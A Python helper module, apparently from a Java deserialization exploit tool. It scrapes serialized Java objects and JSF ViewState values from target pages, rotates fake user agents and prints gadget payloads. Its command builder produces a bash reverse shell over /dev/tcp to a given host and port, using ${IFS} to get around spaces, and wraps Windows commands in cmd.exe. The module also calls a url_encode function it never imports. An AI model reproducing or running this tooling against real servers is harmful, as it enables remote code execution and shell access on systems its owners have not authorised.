import sys
from random import randint

from src.utils.colors import Colors


def print_and_flush(message: str, same_line: bool = False) -> None:
    if same_line:
        print(message, end=" ")
    else:
        print(message)
    if not sys.stdout.isatty():
        sys.stdout.flush()


def get_random_user_agent():
    user_agents = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0",
                   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
                   "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",
                   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
                   "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
                   "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
                   "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
                   "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)",
                   "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
                   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
                   "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36",
                   "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17",
                   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
                   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"]
    return user_agents[randint(0, len(user_agents) - 1)]


def get_serialized_obj_from_param(page: str, param: str) -> str | None:
    """
    Finds the serialized Java object value for the given form parameter in the HTML.
    """
    content = page.replace("\\n", "\n")
    marker = f'name="{param}"'
    for line in content.split("\n"):
        tokens = line.strip().split()
        for i, token in enumerate(tokens):
            if marker in token:
                for nxt in tokens[i + 1: i + 3]:
                    if 'value="' in nxt:
                        val = nxt.split('"')[1]
                        if val.startswith(("H4sI", "rO0")):
                            return val
    return None


def get_html_redirect_link(page: str) -> str | None:
    """
    Находит URL для редиректа в мета-теге http-equiv="refresh" на странице.
    """
    lowered = page.lower().replace("\\n", "\n")
    if 'http-equiv="refresh"' not in lowered:
        return None

    for line in lowered.split("\n"):
        if 'http-equiv="refresh"' in line:
            parts = line.strip().split('"')
            for part in parts:
                if "url=" in part:
                    return part.split("url=")[-1]
    return None


def get_link_for_post(page: str) -> str | None:
    """
    Extracts the form action URL for POST from HTML page.
    """
    content = page.replace("\\n", "\n")
    for line in content.split("\n"):
        if 'application/x-www-form-urlencoded' in line:
            for token in line.strip().split():
                if token.startswith("action=") and len(token) > 8:
                    return token[len('action="'):-1]
    for line in content.split("\n"):
        if 'method="post"' in line.lower():
            for token in line.strip().split():
                if token.startswith("action=") and len(token) > 8:
                    return token[len('action="'):-1]
    return None


def get_url_base(url: str) -> str:
    """
    Возвращает базовый URL (схема + хост) из полного адреса.
    """
    if "://" in url:
        proto, rest = url.split("://", 1)
        return f"{proto}://{rest.split('/')[0]}"
    return url.split("/")[0]


def get_viewstate_value(page: str) -> str | None:
    """
    Returns the value of the javax.faces.ViewState hidden field from the HTML, or None if not found.
    """
    for line in page.replace("\\n", "\n").split("\n"):
        if 'name="javax.faces.ViewState"' in line:
            tokens = line.strip().split()
            for tok in tokens:
                if tok.startswith('value="'):
                    return tok.split('"')[1]
    return None


def generate_cmd_for_runtime_exec(
        cmd: str | None,
        host: str | None,
        port: str | None,
        is_win: bool,
) -> str:
    """
    Формирует команду для выполнения через Runtime.exec():
    - одиночная команда или DNS-запрос возвращается без изменений;
    - для обратной оболочки (/dev/tcp) на Linux;
    - для Windows оборачивается в cmd.exe /C.
    """
    if cmd and len(cmd.strip().split()) == 1:
        return cmd.strip()

    if host and port and not is_win:
        return f"/bin/bash -c /bin/bash${{IFS}}-i>&/dev/tcp/{host}/{port}<&1"

    cleaned = cmd.replace("  ", " ").strip() if cmd else ""
    if is_win:
        return f"cmd.exe /C {cleaned}"
    return f"/bin/bash -c {cleaned.replace(' ', '${IFS}')}"


def shows_payload(payload, gadget_type):
    print_and_flush(Colors.GREEN + "\n------------------------------------------------------------" + Colors.ENDC)
    print_and_flush(Colors.GREEN + " [*] Payload (%s):\n" % gadget_type + Colors.ENDC)
    print_and_flush(url_encode(payload))
    print_and_flush(Colors.GREEN + "------------------------------------------------------------\n" + Colors.ENDC)
